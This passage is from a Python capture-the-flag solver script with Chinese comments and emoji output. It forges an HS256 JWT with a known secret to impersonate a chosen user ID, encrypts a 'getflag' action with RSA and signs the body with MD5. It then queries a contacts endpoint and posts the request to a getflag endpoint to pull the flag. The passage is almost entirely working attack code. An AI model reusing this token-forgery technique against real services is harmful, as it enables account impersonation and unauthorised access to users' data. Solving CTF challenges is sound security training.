
    # 2. 准备要加密的消息
    message = '{"action":"getflag"}'
    print(f"📝 准备加密消息: {message}")

    # 3. RSA加密消息
    try:
        encrypted_data = public_key.encrypt(
            message.encode(),
            padding.PKCS1v15()
        )
        encrypted_b64 = base64.b64encode(encrypted_data).decode()
        print(f"🔐 RSA加密完成，Base64长度: {len(encrypted_b64)}")
    except Exception as e:
        print(f"❌ RSA加密失败: {e}")
        return None

    # 4. 构造请求体
    request_body = {
        "data": encrypted_b64,
    }
    request_json = json.dumps(request_body)

    # 5. 生成MD5签名
    md5_sign = hashlib.md5(request_json.encode()).hexdigest()
    print(f"🔑 MD5签名: {md5_sign}")

    # 6. 生成JWT token
    try:
        jwt_payload = {
            "sub": "1234567890",
            "uid": TARGET_UID,
            "iat": int(time.time())
        }
        jwt_token = jwt.encode(jwt_payload, SECRET, algorithm='HS256')
        print(f"🎫 JWT Token生成成功")
        print(f"📋 Payload: {jwt_payload}")
    except Exception as e:
        print(f"❌ JWT生成失败: {e}")
        return None

    # 7. 先尝试获取联系人信息（可选，用于验证token）
    try:
        print(f"\n📞 尝试获取联系人信息...")
        contacts_url = f"http://{SERVER_IP}/api/v1/contacts?uid={TARGET_UID}"
        contacts_response = requests.get(contacts_url, headers={
            'Authorization': jwt_token,
        }, timeout=10)
        print(f"📊 联系人API响应状态: {contacts_response.status_code}")
        if contacts_response.status_code == 200:
            print(f"📦 联系人数据: {contacts_response.text}")
        else:
            print(f"⚠️  联系人API响应: {contacts_response.text}")
    except Exception as e:
        print(f"⚠️  获取联系人信息失败: {e}")

    # 8. 发送获取flag的请求
    try:
        headers = {
            'Authorization': jwt_token,
            'X-Sign': md5_sign,
            'Content-Type': 'application/json',
            'Accept': 'application/json',
            'User-Agent': 'Flag-Getter/1.0'
        }

        flag_url = f'http://{SERVER_IP}/api/v1/getflag'
        print(f"\n📡 发送Flag请求到: {flag_url}")
        print(f"📋 请求头: {headers}")
        print(f"📋 请求体: {request_json}")

        response = requests.post(
            flag_url,
            headers=headers,
            json=request_body,
            timeout=15
        )

        print(f"📊 响应状态码: {response.status_code}")
        print(f"📦 响应头: {dict(response.headers)}")
        print(f"📦 响应内容: {response.text}")

        if response.status_code == 200:
            try:
                result = response.json()
                print(f"✅ JSON解析成功: {result}")

                # 检查各种可能的flag字段
                flag = None
                if 'flag' in result:
                    flag = result['flag']
                elif 'data' in result and isinstance(result['data'], dict) and 'flag' in result['data']:
                    flag = result['data']['flag']
                elif 'message' in result and 'flag' in str(result['message']).lower():
                    flag = result['message']

                if flag:
                    print(f"\n🎉 成功获取Flag!")
                    print(f"🏆 Flag: {flag}")
                    return flag
                else:
                    print("⚠️  响应中未找到flag字段")
                    return None
            except json.JSONDecodeError:
                print(f"⚠️  响应不是有效的JSON格式")
                # 检查响应中是否直接包含flag
                response_text = response.text.lower()
                if 'flag' in response_text:
                    print(f"🎉 在响应文本中发现flag: {response.text}")
                    return response.text
                return None
        else:
            print(f"❌ 请求失败，状态码: {response.status_code}")
            print(f"❌ 错误信息: {response.text}")
            return None

    except requests.exceptions.RequestException as e:
        print(f"❌ 网络请求错误: {e}")
        return None
    except Exception as e:
        print(f"❌ 处理请求时出错: {e}")
        return None


def main():
    print("🎯 简化版Flag获取工具")
    print("🔧 目标UUID: 9d5ec98c-5848-4450-9e58-9f97b6b3b7bc")
    print("=" * 60)

    flag = get_flag()

    if flag:
        print(f"\n🎊 任务完成!")
        print(f"🏆 最终Flag: {flag}")
        print("=" * 60)
    else:
        print(f"\n❌ 未能获取Flag")
        print("🤔 建议检查:")
        print("  - 网络连接是否正常")
        print("  - 服务器是否可访问")
        print("  - UUID是否正确")
        print("  - JWT密钥是否正确")
        print("=" * 60)


if __name__ == "__main__":
    main()
```

